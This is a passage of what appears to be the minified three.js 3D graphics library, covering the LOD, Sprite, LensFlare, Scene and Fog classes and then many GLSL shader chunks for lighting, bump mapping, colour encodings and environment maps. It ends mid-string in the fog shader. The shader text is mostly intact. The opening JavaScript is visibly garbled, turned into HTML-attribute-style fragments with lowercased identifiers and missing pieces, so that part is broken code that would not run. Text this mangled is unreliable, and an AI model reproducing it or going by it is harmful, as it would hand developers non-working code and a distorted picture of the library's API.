this.constructor(this.geometry,this.material,this.skeleton.usevertextexture)).copy(this)}});three.lod=\"function(){THREE.Object3D.call(this);this.type=\"LOD\";Object.defineProperties(this,{levels:{enumerable:!0,value:[]}})};\" three.lod.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LOD,copy:function(a){THREE.Object3D.prototype.copy.call(this,a,!1);a=a.levels;for(var\" this},addlevel:function(a,b){void=\"\" d&&!(a<b[c].distance);c++);return=\"\" b[c-1].object},raycast:function(){var=\"\" three.vector3;return=\"\" function(b,c){a.setfrommatrixposition(this.matrixworld);var=\"\" three.vector3,b=\"new\" function(c){var=\"\" e=\"1,f=d.length;e<f;e++)if(c\">=\nd[e].distance)d[e-1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),tojson:function(a){a=three.object3d.prototype.tojson.call(this,a);a.object.levels=[];for(var b=\"this.levels,c=0,d=b.length;c<d;c++){var\" e=\"b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return\" a}});three.sprite=\"function(a){THREE.Object3D.call(this);this.type=\"Sprite\";this.material=void\" 0!=\"=a?a:new\" three.spritematerial};=\"\" three.sprite.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Sprite,raycast:function(){var\" a=\"new\" three.vector3;return=\"\" function(b,c){a.setfrommatrixposition(this.matrixworld);var=\"\" d=\"b.ray.distanceSqToPoint(a);d\">this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,face:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});\nTHREE.LensFlare=function(a,b,c,d,e){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)};\nTHREE.LensFlare.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LensFlare,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensflares.push(a.lensflares[b]);return 0=\"==b&&(b=-1);void\" 2=\"\" this},add:function(a,b,c,d,e,f){void=\"\" three.color(16777215));void=\"\" c=\"Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var\" a,b=\"this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-c.rotation)}});\" three.scene=\"function(){THREE.Object3D.call(this);this.type=\"Scene\";this.overrideMaterial=this.fog=this.background=null;this.autoUpdate=!0};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);THREE.Scene.prototype.constructor=THREE.Scene;\" three.scene.prototype.copy=\"function(a,b){THREE.Object3D.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return\" this};three.fog=\"function(a,b,c){this.name=\"\";this.color=new\" three.color(a);this.near=\"void\" 0!=\"=b?b:1;this.far=void\" three.fog.prototype.clone=\"function(){return\" new=\"\" three.fog(this.color.gethex(),this.near,this.far)};three.fogexp2=\"function(a,b){this.name=\"\";this.color=new\" three.color(a);this.density=\"void\" three.fogexp2(this.color.gethex(),this.density)};three.shaderchunk=\"{};THREE.ShaderChunk.alphamap_fragment=\"#ifdef\" use_alphamap\\n\\tdiffusecolor.a=\"\" *=\"texture2D(\" alphamap,=\"\" vuv=\"\" ).g;\\n#endif\\n\";three.shaderchunk.alphamap_pars_fragment=\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\" ;=\"\" three.shaderchunk.alphatest_fragment=\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\" ;three.shaderchunk.aomap_fragment=\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\" three.shaderchunk.aomap_pars_fragment=\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\" ;three.shaderchunk.begin_vertex=\"\\nvec3 transformed = vec3( position );\\n\" ;three.shaderchunk.beginnormal_vertex=\"\\nvec3 objectNormal = vec3( normal );\\n\" ;three.shaderchunk.bsdfs=\"bool testLightInRange( const in float lightDistance, const in float cutoffDistance ) {\\n\\treturn any( bvec2( cutoffDistance == 0.0, lightDistance < cutoffDistance ) );\\n}\\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\" three.shaderchunk.bumpmap_pars_fragment=\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\" three.shaderchunk.clipping_planes_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n#endif\\n\" ;three.shaderchunk.clipping_planes_pars_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\" three.shaderchunk.clipping_planes_pars_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\" ;three.shaderchunk.clipping_planes_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\" ;three.shaderchunk.color_fragment=\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\" ;three.shaderchunk.color_pars_fragment=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\" three.shaderchunk.color_pars_vertex=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\" ;three.shaderchunk.color_vertex=\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\" ;three.shaderchunk.common=\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\n\" three.shaderchunk.cube_uv_reflection_fragment=\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\" three.shaderchunk.defaultnormal_vertex=\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\" ;three.shaderchunk.displacementmap_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\" ;three.shaderchunk.displacementmap_pars_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\" three.shaderchunk.emissivemap_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\" ;three.shaderchunk.emissivemap_pars_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\" ;three.shaderchunk.encodings_pars_fragment=\"\\nvec4 LinearToLinear( in vec4 value ) {\\n  return value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n  return vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n  float maxComponent = max( max( value.r, value.g ), value.b );\\n  float fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n  return vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n  return vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n  float maxRGB = max( value.x, max( value.g, value.b ) );\\n  float M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n  M            = ceil( M * 255.0 ) / 255.0;\\n  return vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n    return vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n    float maxRGB = max( value.x, max( value.g, value.b ) );\\n    float D      = max( maxRange / maxRGB, 1.0 );\\n    D            = min( floor( D ) / 255.0, 1.0 );\\n    return vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n  vec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n  Xp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n  vec4 vResult;\\n  vResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n  float Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n  vResult.w = fract(Le);\\n  vResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n  return vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n  float Le = value.z * 255.0 + value.w;\\n  vec3 Xp_Y_XYZp;\\n  Xp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n  Xp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n  Xp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n  vec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n  return vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\" three.shaderchunk.encodings_fragment=\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\" ;three.shaderchunk.envmap_fragment=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\" three.shaderchunk.envmap_pars_fragment=\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntenstiy;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\" three.shaderchunk.envmap_pars_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.envmap_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\" three.shaderchunk.fog_fragment=\"#ifdef USE_FOG\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tfloat depth = gl_FragDepthEXT / gl_FragCoord.w;\\n\\t#else\\n\\t\\tfloat depth = gl_FragCoord.z / 